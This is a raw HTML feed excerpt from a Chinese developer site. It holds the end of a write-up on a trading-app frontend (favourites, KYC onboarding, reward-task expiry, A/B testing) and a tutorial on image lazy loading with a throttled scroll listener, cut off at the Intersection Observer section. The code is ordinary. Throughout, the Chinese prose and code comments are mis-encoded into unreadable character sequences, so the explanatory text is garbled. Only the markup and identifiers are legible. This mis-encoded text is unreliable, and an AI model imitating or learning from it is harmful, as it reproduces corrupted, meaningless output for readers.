<li>å‰ç«¯æ˜¾ç¤ºå·²è¿‡æœŸä»»åŠ¡çš„å¥–åŠ±é‡‘é¢</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âœ… åŒé‡åˆ¤æ–­ï¼šæœåŠ¡ç«¯è¿”å› + å‰ç«¯è®¡ç®—</span>
<span class="hljs-keyword">const</span> isTaskValid = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!taskData) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">if</span> (taskData.<span class="hljs-property">remain_sec</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;

  <span class="hljs-comment">// é¢å¤–æ ¡éªŒï¼šæ³¨å†Œå &gt;7 å¤©è‡ªåŠ¨è¿‡æœŸ</span>
  <span class="hljs-keyword">const</span> registrationTime = userInfo.<span class="hljs-property">created_at</span>;
  <span class="hljs-keyword">const</span> daysSinceRegistration = (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - registrationTime) / (<span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span>);
  <span class="hljs-keyword">return</span> daysSinceRegistration &lt;= <span class="hljs-number">7</span>;
}, [taskData, userInfo]);

<span class="hljs-comment">// è¿‡æœŸå›é€€åˆ°åŸæœ‰ UI</span>
<span class="hljs-keyword">return</span> isTaskValid ? (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">GuideWithRewards</span> <span class="hljs-attr">taskData</span>=<span class="hljs-string">{taskData}</span> /&gt;</span></span>
) : (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LegacyGuide</span> /&gt;</span></span>
);
</code></pre>
<h2 data-id="heading-20">R (Result) - é¡¹ç›®æˆæœ</h2>
<h3 data-id="heading-21">ä¸€ã€åŠŸèƒ½äº¤ä»˜æˆæœ</h3>
<p>âœ… <strong>Markets æ”¶è—åŠŸèƒ½ï¼ˆå·²å…¨é‡ä¸Šçº¿ï¼‰</strong></p>
<ul>
<li>Favorites æ ‡ç­¾é¡µï¼ˆç©ºçŠ¶æ€ + æ”¶è—åˆ—è¡¨ï¼‰</li>
<li>æ˜Ÿæ ‡äº¤äº’è¦†ç›– 5 ä¸ªæ’è¡Œæ¦œï¼ˆHot/NewListing/Gainers/Losers/Turnoverï¼‰</li>
<li>PC + H5 åŒç«¯å®Œæ•´é€‚é…</li>
<li>ç°è´§å’Œè¡ç”Ÿå“ç‹¬ç«‹ç®¡ç†</li>
<li>åˆ†é¡µåŠŸèƒ½ï¼ˆæ¯é¡µ 6 ä¸ªï¼Œè¶…è¿‡æ˜¾ç¤ºåˆ†é¡µå™¨ï¼‰</li>
<li>å»¶è¿Ÿåˆ·æ–°æœºåˆ¶ï¼ˆåˆ‡æ¢ Tab æ—¶åŒæ­¥ï¼‰</li>
</ul>
<p>âœ… <strong>æ–°æ‰‹å¼•å¯¼è¿­ä»£ï¼ˆAB å®éªŒè¿›è¡Œä¸­ï¼‰</strong></p>
<ul>
<li>KYC çŠ¶æ€ä» 2 ç§æ‰©å±•åˆ° 6 ç§ï¼ˆè¦†ç›–å…¨æµç¨‹ï¼‰</li>
<li>æ–°æ‰‹ä»»åŠ¡å¥–åŠ±å±•ç¤ºï¼ˆKYC + å…¥é‡‘åŒä»»åŠ¡ï¼‰</li>
<li>å€’è®¡æ—¶ç»„ä»¶ï¼ˆå®æ—¶æ›´æ–°å‰©ä½™æ—¶é—´ï¼‰</li>
<li>åŠ¨æ€è§†é¢‘å¼•å¯¼ï¼ˆWebP æ ¼å¼ï¼Œè‡ªåŠ¨æ’­æ”¾ï¼‰</li>
<li>AB å®éªŒæ§åˆ¶é€»è¾‘ï¼ˆuseSensors åŠ¨æ€åˆ†ç»„ï¼‰</li>
</ul>
<p>âœ… <strong>æ•°æ®åŸ‹ç‚¹ä½“ç³»</strong></p>
<ul>
<li>Markets æ¨¡å—ï¼š3 ä¸ªå…³é”®èŠ‚ç‚¹ï¼ˆæ›å…‰ã€æ·»åŠ ã€åˆ é™¤ï¼‰</li>
<li>Guides æ¨¡å—ï¼š6 ç§ KYC çŠ¶æ€åŸ‹ç‚¹ + AB åˆ†ç»„æ ‡è®°</li>
<li>My Assets æ¨¡å—ï¼šè¡¥å……èµ„äº§è¯¦æƒ…ç‚¹å‡»åŸ‹ç‚¹</li>
</ul>
<h3 data-id="heading-22">äºŒã€æŠ€æœ¯äº®ç‚¹</h3>
<h4 data-id="heading-23">2.1 çŠ¶æ€ç®¡ç†ä¼˜åŒ–</h4>
<p><strong>æˆæœï¼š</strong></p>
<ul>
<li>API è°ƒç”¨æ¬¡æ•°å‡å°‘ 40%ï¼ˆé€šè¿‡ Context å…±äº«æ•°æ®ï¼‰</li>
<li>æ“ä½œå“åº”æ—¶é—´ &lt; 100msï¼ˆä¹è§‚æ›´æ–°ç­–ç•¥ï¼‰</li>
<li>çŠ¶æ€åŒæ­¥å‡†ç¡®ç‡ 100%ï¼ˆå»¶è¿Ÿåˆ·æ–°æœºåˆ¶ï¼‰</li>
</ul>
<p><strong>æŠ€æœ¯æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">useCollect</span>() â†’ æœ¬åœ°çŠ¶æ€ç«‹å³æ›´æ–° â†’ å¼‚æ­¥åŒæ­¥æœåŠ¡ç«¯ â†’ åˆ‡æ¢ Tab æ—¶åˆ·æ–°
</code></pre>
<h4 data-id="heading-24">2.2 ä»£ç å¤ç”¨ç‡æå‡</h4>
<p><strong>æˆæœï¼š</strong></p>
<ul>
<li>PC å’Œ H5 å…±äº« 70% ç»„ä»¶ä»£ç </li>
<li>è‡ªå®šä¹‰ Hook å°è£… 5 ä¸ªæ ¸å¿ƒé€»è¾‘</li>
<li>ä»£ç è¡Œæ•°å‡å°‘ 30%ï¼ˆç›¸æ¯”åˆç‰ˆè®¾è®¡ï¼‰</li>
</ul>
<p><strong>å…³é”® Hooksï¼š</strong></p>
<ul>
<li><code>useCollect</code> - æ”¶è—çŠ¶æ€ç®¡ç†ï¼ˆ220 è¡Œï¼‰</li>
<li><code>useKycStatus</code> - KYC çŠ¶æ€ç®¡ç†</li>
<li><code>useNewbieTaskRewards</code> - æ–°æ‰‹ä»»åŠ¡å¥–åŠ±ç®¡ç†</li>
<li><code>useMarketData</code> - å¸‚åœºæ•°æ®å…±äº«</li>
<li><code>useSensors</code> - AB å®éªŒæ§åˆ¶</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026å¹´äº†ï¼Œä½ è¿˜åœ¨ç”¨ä¼ ç»Ÿæ»šåŠ¨ç›‘å¬åšæ‡’åŠ è½½ï¼Ÿè¯•è¯•è¿™ç§ç°ä»£æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7600863478929866771</link>    <guid>https://juejin.cn/post/7600863478929866771</guid>    <pubDate>2026-01-30T12:30:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600863478929866771" data-draft-id="7600663744192200740" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026å¹´äº†ï¼Œä½ è¿˜åœ¨ç”¨ä¼ ç»Ÿæ»šåŠ¨ç›‘å¬åšæ‡’åŠ è½½ï¼Ÿè¯•è¯•è¿™ç§ç°ä»£æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-30T12:30:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°é‡‘é±¼Y"/> <meta itemprop="url" content="https://juejin.cn/user/3124127510042122"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026å¹´äº†ï¼Œä½ è¿˜åœ¨ç”¨ä¼ ç»Ÿæ»šåŠ¨ç›‘å¬åšæ‡’åŠ è½½ï¼Ÿè¯•è¯•è¿™ç§ç°ä»£æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3124127510042122/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°é‡‘é±¼Y
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:30:56.000Z" title="Fri Jan 30 2026 12:30:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<blockquote>
<p>å½“æˆ‘ä»¬è¿›å…¥æŸä¸ªåŒ…å«å¤§é‡å›¾ç‰‡çš„ç½‘ç«™æ—¶ï¼Œç½‘é¡µå†…çš„å›¾ç‰‡å´è¿Ÿè¿ŸåŠ è½½ä¸å‡ºæ¥ï¼Œç»™æˆ‘ä»¬å¸¦æ¥äº†æå·®çš„ç”¨æˆ·ä½“éªŒï¼Œè€Œæ‡’åŠ è½½æŠ€æœ¯ï¼Œæ­£æ˜¯è§£å†³è¿™ç±»é—®é¢˜çš„æœ‰æ•ˆæ‰‹æ®µä¹‹ä¸€ã€‚</p>
<p>ä¼ ç»Ÿçš„æ»šåŠ¨ç›‘å¬æ‡’åŠ è½½æ–¹å¼åœ¨è¿‡å»å‘æŒ¥äº†é‡è¦ä½œç”¨ï¼Œä½†éšç€æŠ€æœ¯çš„ä¸æ–­é©æ–°ï¼Œ2026å¹´çš„ä»Šå¤©ï¼Œæˆ‘ä»¬æœ‰äº†æ›´ä¸ºç°ä»£ã€é«˜æ•ˆçš„æ–¹æ¡ˆå¯ä¾›é€‰æ‹©ã€‚æ¥ä¸‹æ¥ï¼Œå°±è®©æˆ‘ä»¬æ·±å…¥æ¢ç©¶ä¸€ç•ªã€‚</p>
</blockquote>
<h2 data-id="heading-1">ä»€ä¹ˆæ˜¯æ‡’åŠ è½½ ï¼Ÿ</h2>
<p>æ‡’åŠ è½½ï¼ˆLazy Loadingï¼‰æ˜¯å‰ç«¯å¼€å‘ä¸­<strong>å»¶è¿ŸåŠ è½½éå…³é”®èµ„æº</strong>çš„ä¼˜åŒ–æŠ€æœ¯ï¼Œé€šè¿‡<code>ä»…åœ¨èµ„æºè¿›å…¥ç”¨æˆ·å¯è§†åŒºåŸŸæ—¶åŠ è½½</code>ï¼Œæ˜¾è‘—å‡å°‘åˆå§‹è¯·æ±‚æ•°ã€é™ä½å†…å­˜å ç”¨ï¼Œæå‡é¡µé¢åŠ è½½é€Ÿåº¦å’Œç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-2">æ ¸å¿ƒåŸç†ï¼šæŒ‰éœ€åŠ è½½çš„æœ¬è´¨</h2>
<p>æ‡’åŠ è½½çš„æ ¸å¿ƒé€»è¾‘åŸºäºè§†çª—æ£€æµ‹å’Œæ¡ä»¶è§¦å‘ï¼Œåˆ†ä¸ºä¸‰æ­¥ï¼š</p>
<ol>
<li><strong>èµ„æºæš‚å­˜</strong>:å°†çœŸå®çš„èµ„æºåœ°å€ï¼ˆå¦‚å›¾ç‰‡çš„é“¾æ¥ï¼‰å­˜å‚¨åœ¨HTML5çš„è‡ªå®šä¹‰å±æ€§ï¼ˆå¦‚data-srcï¼‰ä¸­ï¼Œè€Œéç›´æ¥èµ‹å€¼ç»™srcï¼Œé¿å…åˆæ¬¡åŠ è½½ã€‚</li>
<li><strong>è§†çª—æ£€æµ‹</strong>ï¼šé€šè¿‡ç›‘å¬æ»šåŠ¨äº‹ä»¶æˆ–è€…ä½¿ç”¨æµè§ˆå™¨APIï¼ˆå¦‚<code>Intersection Observer</code>ï¼‰ï¼Œåˆ¤æ–­èµ„æºæ˜¯å¦è¿›å…¥ç”¨æˆ·çš„å¯è§†åŒºåŸŸã€‚</li>
<li><strong>åŠ¨æ€åŠ è½½</strong>ï¼šå½“èµ„æºè¿›å…¥è§†çª—å†…ï¼Œå°†data-srcçš„å€¼èµ‹å€¼ç»™srcï¼Œè§¦å‘æµè§ˆå™¨åŠ è½½çœŸå®èµ„æºã€‚</li>
</ol>
<p>å…¶æœ¬è´¨å°±æ˜¯å°†â€œä¸€æ¬¡æ€§å…¨é‡åŠ è½½â€è½¬åŒ–ä¸ºâ€œæŒ‰éœ€å¢é‡åŠ è½½â€ï¼Œå‡å°‘åˆå§‹é¡µé¢çš„èµ„æºè¯·æ±‚å’Œæ¸²æŸ“å‹åŠ›ã€‚</p>
<h2 data-id="heading-3">å®ç°æ–¹æ³•</h2>
<h3 data-id="heading-4">1. åŸç”ŸJavaScriptå®ç° - ä¼ ç»Ÿæ»šåŠ¨ç›‘å¬</h3>
<h4 data-id="heading-5">å®šä¹‰æ ¸å¿ƒå˜é‡</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f44f959ca801419ab3e070a7a81995bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=rY1t%2FqmxYKrKtKxksxRq9ehEE9c%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šè·å–å½“å‰æµè§ˆå™¨çª—å£çš„å¯è§†é«˜åº¦ï¼ˆå•ä½ï¼šåƒç´ ï¼‰ï¼Œç”¨äºåˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¿›å…¥ç”¨æˆ·è§†é‡ã€‚</li>
</ul>
<h4 data-id="heading-6">æ‡’åŠ è½½æ ¸å¿ƒå‡½æ•°</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d169b7340e28486bb0be7fabbd2b5087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=CYvzBgZGpoqKl%2BOMkzTPtC7uT8Q%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>getBoundingClientRect()</strong>ï¼šÂ è¿”å›å…ƒç´ çš„ä½ç½®ä¿¡æ¯ï¼ˆ<code>top</code>/<code>bottom</code>/<code>left</code>/<code>right</code>ç­‰ï¼‰ï¼Œæ˜¯åˆ¤æ–­å…ƒç´ æ˜¯å¦åœ¨è§†å£å†…çš„æ ¸å¿ƒä¾æ®ã€‚</li>
<li><strong>è‡ªå®šä¹‰å±æ€§</strong>ï¼š<code>data-origin</code>Â å­˜å‚¨å›¾ç‰‡çš„çœŸå®URLï¼ˆé¿å…åˆå§‹åŠ è½½ï¼‰ï¼Œ<code>lazyload</code>Â æ ‡è®°å›¾ç‰‡ä¸ºâ€œå¾…åŠ è½½çŠ¶æ€â€</li>
</ul>
<h4 data-id="heading-7">åˆå§‹åŒ–ä¸æ»šåŠ¨ç›‘å¬</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c7246943f084a88aa9a7f33be9887dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=6Bu8bYXwl86nAzUPr6GKp6RBvT8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>åˆå§‹åŒ–æ‰§è¡Œ</strong>ï¼šé¡µé¢åŠ è½½å®Œæˆåç«‹å³è°ƒç”¨Â <code>lazyLoad()</code>ï¼Œç¡®ä¿é¦–å±å›¾ç‰‡æ­£å¸¸æ˜¾ç¤ºã€‚</li>
<li><strong>æ»šåŠ¨ç›‘å¬</strong>ï¼šå½“ç”¨æˆ·æ»šåŠ¨é¡µé¢æ—¶ï¼ŒæŒç»­åˆ¤æ–­åç»­å›¾ç‰‡æ˜¯å¦è¿›å…¥è§†å£ï¼Œä½†ç›´æ¥ç›‘å¬Â <code>scroll</code>Â ä¼šå¯¼è‡´äº‹ä»¶è§¦å‘è¿‡äºé¢‘ç¹ï¼ˆæ¯ç§’å¯èƒ½è§¦å‘æ•°åæ¬¡ï¼‰ï¼Œå› æ­¤éœ€è¦<strong>èŠ‚æµå‡½æ•°</strong>ä¼˜åŒ–ã€‚</li>
</ul>
<h4 data-id="heading-8">èŠ‚æµå‡½æ•° - throttle()</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0db002c53851461d8b2109af7605b784~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=HKM37FAUkgEWFb8NMRmaHpy1fys%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>æ ¸å¿ƒä½œç”¨</strong>ï¼šé™åˆ¶Â <code>lazyLoad</code>Â çš„æ‰§è¡Œé¢‘ç‡ï¼ˆç¤ºä¾‹ä¸­ä¸º<strong>æ¯1000æ¯«ç§’æ‰§è¡Œä¸€æ¬¡</strong>ï¼‰ï¼Œé¿å…æ»šåŠ¨æ—¶é¢‘ç¹è§¦å‘å‡½æ•°å¯¼è‡´æ€§èƒ½æµªè´¹ã€‚</li>
<li><strong>é—­åŒ…ç‰¹æ€§</strong>ï¼š<code>preTime</code>Â å˜é‡è¢«é—­åŒ…ä¿å­˜ï¼Œæ¯æ¬¡æ»šåŠ¨æ—¶éƒ½ä¼šå¯¹æ¯”â€œå½“å‰æ—¶é—´â€ä¸â€œä¸Šæ¬¡æ‰§è¡Œæ—¶é—´â€ï¼Œç¡®ä¿åœ¨è§„å®šé—´éš”å†…åªæ‰§è¡Œä¸€æ¬¡</li>
</ul>
<h4 data-id="heading-9">å®Œæ•´ä»£ç ï¼š</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">img</span> {
            <span class="hljs-attribute">display</span>: block;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">""</span> <span class="hljs-attr">lazyload</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">data-origin</span>=<span class="hljs-string">"å›¾ç‰‡åœ°å€"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å¤šå¼ å›¾ç‰‡çœç•¥ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// å¯è§†åŒºåŸŸçš„é«˜åº¦</span>
        <span class="hljs-keyword">const</span> viewHeight = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">lazyLoad</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> imgs = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'img[lazyload]'</span>)
            <span class="hljs-comment">// åˆ¤æ–­å“ªäº› img åœ¨å¯è§†åŒºåŸŸå†…</span>
            imgs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
                <span class="hljs-comment">// itemæ˜¯å¦åœ¨å¯è§†åŒºåŸŸå†…</span>
                <span class="hljs-keyword">const</span> rect = item.<span class="hljs-title function_">getBoundingClientRect</span>() 
                <span class="hljs-keyword">if</span> (rect.<span class="hljs-property">top</span> &lt; viewHeight &amp;&amp; rect.<span class="hljs-property">bottom</span> &gt;= <span class="hljs-number">0</span>) {
                    item.<span class="hljs-property">src</span> = item.<span class="hljs-property">dataset</span>.<span class="hljs-property">origin</span>
                    item.<span class="hljs-title function_">removeAttribute</span>(<span class="hljs-string">'lazyload'</span>)
                }
            })
        }
        
        <span class="hljs-title function_">lazyLoad</span>()

        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-title function_">throttle</span>(lazyLoad, <span class="hljs-number">1000</span>))<span class="hljs-comment">//ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•°ä½“</span>

        <span class="hljs-comment">//èŠ‚æµ-åœ¨è§„å®šçš„æ—¶é—´å†…åªè§¦å‘ä¸€æ¬¡</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">fn, <span class="hljs-keyword">await</span></span>) {
            <span class="hljs-keyword">let</span> preTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
            <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">const</span> nowTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
                <span class="hljs-keyword">if</span> (nowTime - preTime &gt;= <span class="hljs-keyword">await</span>) {
                    <span class="hljs-title function_">fn</span>()
                    preTime = nowTime
                }
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">2. ç°ä»£æµè§ˆå™¨æ–¹æ¡ˆ - Intersection Observer API</h3>
<p><code>Intersection Observer</code>æ˜¯<strong>åŸºäºç°ä»£æµè§ˆå™¨åŸç”Ÿ API çš„å›¾ç‰‡æ‡’åŠ è½½æ–¹æ¡ˆ</strong>ï¼Œç›¸æ¯”ä¼ ç»Ÿçš„æ»šåŠ¨ç›‘å¬+èŠ‚æµï¼Œå®ƒæ›´é«˜æ•ˆã€æ›´ç®€æ´ï¼Œæ ¸å¿ƒé€»è¾‘æ˜¯<strong>ç”±æµè§ˆå™¨è‡ªåŠ¨ç›‘å¬å›¾ç‰‡æ˜¯å¦è¿›å…¥è§†å£</strong>ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†æ»šåŠ¨äº‹ä»¶ã€‚</p>
